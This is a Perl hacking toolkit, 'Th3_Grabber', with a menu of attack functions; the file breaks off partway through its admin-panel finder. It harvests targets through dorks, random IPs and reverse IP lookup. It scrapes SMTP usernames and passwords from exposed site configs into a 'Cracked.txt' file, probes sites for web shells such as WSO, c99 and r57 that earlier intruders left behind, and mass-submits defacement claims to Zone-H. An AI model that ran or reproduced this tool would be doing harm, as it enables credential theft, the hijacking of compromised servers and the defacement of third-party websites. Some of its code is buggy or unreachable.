#!/usr/bin/perl

#Th3_Grabber Tool :D
#Coded BY Kadd3chy
#Version : 1.9

use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

$Kadd3chy="

 _____ _     _____  ____           _     _               
|_   _| |__ |___ / / ___|_ __ __ _| |__ | |__   ___ _ __ 
  | | | '_ \  |_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
  | | | | | |___) | |_| | | | (_| | |_) | |_) |  __/ |   
  |_| |_| |_|____/ \____|_|  \__,_|_.__/|_.__/ \___|_|   

              [127.0.0.1] [Kadd3chy]
";

print color 'bold green';
print $Kadd3chy;

print color('bold red'),"[";
print color('bold green'),"01";
print color('bold red'),"] ";
print color('bold white'),"Bing Dorker\n";
print color('bold red'),"[";
print color('bold green'),"02";
print color('bold red'),"] ";
print color('bold white'),"Reverse IP Lookup\n";
print color('bold red'),"[";
print color('bold green'),"03";
print color('bold red'),"] ";
print color('bold white'),"SMTP Grabber From The Config\n";
print color('bold red'),"[";
print color('bold green'),"04";
print color('bold red'),"] ";
print color('bold white'),"Zone-H Mass Poster\n";
print color('bold red'),"[";
print color('bold green'),"05";
print color('bold red'),"] ";
print color('bold white'),"Shell Checker\n";
print color('bold red'),"[";
print color('bold green'),"06";
print color('bold red'),"] ";
print color('bold white'),"Shell Finder\n";
print color('bold red'),"[";
print color('bold green'),"07";
print color('bold red'),"] ";
print color('bold white'),"Admin Panel Finder\n";
print color('bold red'),"[";
print color('bold green'),"08";
print color('bold red'),"] ";
print color('bold white'),"About Coder / Tool\n";
print color('bold red'),"[";
print color('bold green'),"09";
print color('bold red'),"] ";
print color('bold white'),"Exit\n";
print color("bold green"),"[-] Choose Number : ";


my $Kadd3chyWinou = <STDIN>;
chomp $Kadd3chyWinou;
if($Kadd3chyWinou eq '01'){
bing();
}
if($Kadd3chyWinou eq '02'){
rev();
}
if($Kadd3chyWinou eq '03'){
smtpgrab();
}
if($Kadd3chyWinou eq '08'){
aboutc();
}
if($Kadd3chyWinou eq '07'){
apf();
}
if($Kadd3chyWinou eq '05'){
sc();
}
if($Kadd3chyWinou eq '06'){
sf();
}
if($Kadd3chyWinou eq '04'){
zone();
}
if($Kadd3chyWinou eq '09'){
exit;
}

sub bing(){
system('cls');

$logo="
 _______ _     ____   _____           _     _               
|__   __| |   |___ \ / ____|         | |   | |              
   | |  | |__   __) | |  __ _ __ __ _| |__ | |__   ___ _ __ 
   | |  | '_ \ |__ <| | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
   | |  | | | |___) | |__| | | | (_| | |_) | |_) |  __/ |   
   |_|  |_| |_|____/ \_____|_|  \__,_|_.__/|_.__/ \___|_|  
   
";

print color 'bold green';
print $logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
spyzonesone();
}
}


if($targett eq '2')
{
fscoity();
sub fscoity(){
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}

}
}
if($targett eq '3')
{
spyx2();
sub spyx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}

if($targett eq '4')
{
spyx1();
sub spyx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumspy = <STDIN>;
chomp $ipnumspy;

for (1..$ipnumspy){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
		  open(save, '>>chen3a.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
spyzonesone();

}
minibot();
open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
spyzonesone();
minibot();


}
####################################"
sub spyzonesone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tobotv3.txt');
    print savea "$link\n";
    close(savea);
	

						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub spyzonesonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}

sub rev(){
system('cls');

$Kadd3chy="

 _____ _     _____  ____           _     _               
|_   _| |__ |___ / / ___|_ __ __ _| |__ | |__   ___ _ __ 
  | | | '_ \  |_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
  | | | | | |___) | |_| | | | (_| | |_) | |_) |  __/ |   
  |_| |_| |_|____/ \____|_|  \__,_|_.__/|_.__/ \___|_|   

              [127.0.0.1] [Kadd3chy]
";

print color 'bold green';
print $Kadd3chy;

print "\n[-] You wanna use Proxy ? (Y/N):";
my $chose = <>;
chomp($chose);

if(lc($chose) eq 'y') {
sleep (3);
print "\n\n [+]Put Proxy (ex: 127.0.0.1:80) :";
my $proxy = <>;
chomp($proxy);
print "\n\n[*]Put Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "yes.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$ua->proxy('http', 'http://'.$proxy.'');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>yes.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+]All website Reversed.\n";
}
if(lc($chose) eq 'n') {

print "\nPut Host or IP (host without http://) :";
my $host = <>;
chomp($host);
my $file = "yes.txt";
my $ua = LWP::UserAgent->new(agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5');
my $zz = $ua->post('http://domains.yougetsignal.com/domains.php',
{
        remoteAddress => $host,
}
);

my $resulta = $zz->content;
while ($resulta =~ m/\[([^\]]*)\]/g)
{
        $zeb = $1;
        $zeb =~ m/\"(.*?)\", \"?\"/g;
open(a, ">>yes.txt");
print a "http://$1/\n";
close(a);
}
if($resulta =~ /\"domainCount\":\"(.*?)\"/) {
sleep(2);
  print "\n  [*]Total website Recolted: $1\n";
}
if($resulta =~ /\"remoteIpAddress\":\"(.*?)\"/) {
sleep(1);

  print "\n  [*]IP serveur: $1\n";
}
print "\n[+] All Websites Was Reversed.\n";
}
}

sub smtpgrab(){
system('cls');

$Kadd3chy="

 _____ _     _____  ____           _     _               
|_   _| |__ |___ / / ___|_ __ __ _| |__ | |__   ___ _ __ 
  | | | '_ \  |_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
  | | | | | |___) | |_| | | | (_| | |_) | |_) |  __/ |   
  |_| |_| |_|____/ \____|_|  \__,_|_.__/|_.__/ \___|_|   

              [127.0.0.1] [Kadd3chy]
";

print $Kadd3chy;
	
smtpcracker();

sub smtpcracker(){

print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "Add List Sir \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
tazx();


}
}
sub tazx(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $cont = $ua->get("$site")->content;

# // Kadd3chy Was Here :D xD   //




        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print "\t SMTP User = $1 \n";
        open (TEXT, '>>Cracked.txt');
        print TEXT " SMTP INFO\n SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print "\t SMTP Password = $1 \n";
        open (TEXT, '>>Cracked.txt');
        print TEXT " SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print "\t SMTP Port = $1 \n";
        open (TEXT, '>>Cracked.txt');
        print TEXT "SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print "\t SMTP Host = $1 \n\n";
        open (TEXT, '>>Cracked.txt');
        print TEXT "SMTP Host = $1\n";
        close (TEXT);
  
}
else{
print  "---------------------->: ";            
print "Sorry";
print "\n";

    }

}							
}

sub sc(){
system('cls');

$Kadd3chy="

 _____ _     _____  ____           _     _               
|_   _| |__ |___ / / ___|_ __ __ _| |__ | |__   ___ _ __ 
  | | | '_ \  |_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
  | | | | | |___) | |_| | | | (_| | |_) | |_) |  __/ |   
  |_| |_| |_|____/ \____|_|  \__,_|_.__/|_.__/ \___|_|   

              [127.0.0.1] [Kadd3chy]
";

print $Kadd3chy;

print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "Add List Sir \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
sc();
}
sub sc(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[checking] $site";
#/wp-admin/setup-config.php
#/wordpress/wp-admin/setup-config.php
#/wp-admin/setup-config.php


my $spyxy = $ua->get("$site")->content;

if($spyxy =~/Kadd3chy/) {

    print color('bold green');
	    print  "[Found] ==> $site \n";

    open(save, '>>Working.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

}
    elsif ($spyxy =~/WSO 2.6/){
    print color('bold green');
	    print  "[Found] ==> $site\n";

	    open(save, '>>Working.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

    } elsif ($spyxy =~/Uname:/){
    print color('bold green');
	    print  "[Found] ==> $site \n";

	    open(save, '>>Working.txt');
    print save "[Found] ==> $site \n";
    close(save);
    print color('reset');

    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }
		}
	}

sub zone(){
system('cls');

$Kadd3chy="

 _____ _     _____  ____           _     _               
|_   _| |__ |___ / / ___|_ __ __ _| |__ | |__   ___ _ __ 
  | | | '_ \  |_ \| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
  | | | | | |___) | |_| | | | (_| | |_) | |_) |  __/ |   
  |_| |_| |_|____/ \____|_|  \__,_|_.__/|_.__/ \___|_|   

              [127.0.0.1] [Kadd3chy]
";
print $Kadd3chy;

  print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
print"[Zone-h Poster] ...................... ";

    open(save, '>>ZonedSuccefuly.txt');
    print save "$magento\n";
    close(save);
    ########### Add Your Nickname Here :D ###########

                                $hack="Kadd3chy";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $magento,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="white on_red">ERROR<\/font><\/li>/) {
   print color('white on_red');
print "Failed\n";
    print color('reset');

                                }
                                elsif ($res->content =~ /color="blue">OK<\/font><\/li>/) {
   print color('bold blue');
print " ++ Don3 ++\n";
    print color('reset');



                                }
                                else
                                {
   print color('white on_red');
print " Failed :( \n";
    print color('reset');
                                }
                            }
              
}


sub sf(){
system('cls');

$logo="
 _______ _     ____   _____           _     _               
|__   __| |   |___ \ / ____|         | |   | |              
   | |  | |__   __) | |  __ _ __ __ _| |__ | |__   ___ _ __ 
   | |  | '_ \ |__ <| | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
   | |  | | | |___) | |__| | | | (_| | |_) | |_) |  __/ |   
   |_|  |_| |_|____/ \_____|_|  \__,_|_.__/|_.__/ \___|_|  
   
";

print color 'bold green';
print $logo;

sub brute(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
brutespy();
}
}
sub brutespy($site){


	

 
 
@path = ('wso.php','css/1/jou.php','FARES.php','fares.php','WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',);
 
foreach $myshell(@path){
 
$shellzspy = $site.'/'.$myshell;
$req = HTTP::Request->new(GET=>$shellzspy);
$useragent = LWP::UserAgent->new();
 
$response = $useragent->request($req);
 
if ($response->is_success){
print "Shell Found Ya Spy : $shellzspy\n";
 open(save, '>>ShellbruteSpy.txt');
    print save "$shellzspy\n";
	    close(save);

}else{
print "Failed Ya Spy : $myshell\n";
}
}
}
}

sub apf(){
system('cls');

$logo="
 _______ _     ____   _____           _     _               
|__   __| |   |___ \ / ____|         | |   | |              
   | |  | |__   __) | |  __ _ __ __ _| |__ | |__   ___ _ __ 
   | |  | '_ \ |__ <| | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|
   | |  | | | |___) | |__| | | | (_| | |_) | |_) |  __/ |   
   |_|  |_| |_|____/ \_____|_|  \__,_|_.__/|_.__/ \___|_|  
   
";

print color 'bold green';
print $logo;

print " Enter Target\n Example: www.example.com\n: ";
        $site=<STDIN>;
        chomp $site;

        print "\n";
        print "-> Save Results ? y (yes) /n (no) ";
        $save=<STDIN>;
        chomp $save;

        print "\n";
        print " Target source: \n\n1 = html\n 2 = asp\n 3 = aspx\n 4 = cfm\n 5 = js\n 6 = cgi\n 7 = brf\n 8 = Intense\n: ";
        $code=<STDIN>;
        chomp($code);

        if ( $site !~ /^http:/ ) {
        $site = 'http://' . $site;
        }
        if ( $site !~ /\/$/ ) {
        $site = $site . '/';
        }
        print "\n";

        print "-> Target: $site\n";
        print "-> Site source code: $code\n";
        print "-> Searching admin panel...\n\n\n";

        if($code eq "2"){

        @path1=('admin/','user/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
        'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
        'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
        'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
        'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
        'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
        'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
        'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
        'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
        'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
        'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
        'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
        'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
        'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
        );

        foreach $ways(@path1){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
        $response->content =~ /usager/ ||
        $response->content =~ /Sing/ ||
        $response->content =~ /passe/ ||
        $response->content =~ /P\/W/ || 
        $response->content =~ /Admin Password/
        ){
        print " \n [+] Found -> $final\n\n";

        if ($save eq "y"){
        print "Save stored\n";
        open (MYFILE, '>>med.txt');
        print MYFILE " \n $final\n";
        close (MYFILE); 
        }
        if ($save eq "n"){
        print "Save NOT stored\n"; }
        }else{
        print "[-] Not Found <- $final\n";
        }
        }
        }

        if($code eq "1"){

        @path2=('admin/','administrator/','user/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
        'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
        'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
        'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
        'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
        'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
        'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
        'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
        'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
        'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
        );

        foreach $ways(@path2){

        $final=$site.$ways;

        my $req=HTTP::Request->new(GET=>$final);
        my $ua=LWP::UserAgent->new();
        $ua->timeout(30);
        my $response=$ua->request($req);

        if($response->content =~ /Username/ ||
        $response->content =~ /Password/ ||
        $response->content =~ /username/ ||
        $response->content =~ /password/ ||
        $response->content =~ /USERNAME/ ||
        $response->content =~ /PASSWORD/ ||
        $response->content =~ /Username/ ||
        $response->content =~ /Wachtwoord/ ||
        $response->content =~ /Senha/ ||
        $response->content =~ /senha/ ||
        $response->content =~ /Personal/ ||
        $response->content =~ /Usuario/ ||
        $response->content =~ /Clave/ ||
        $response->content =~ /Usager/ ||
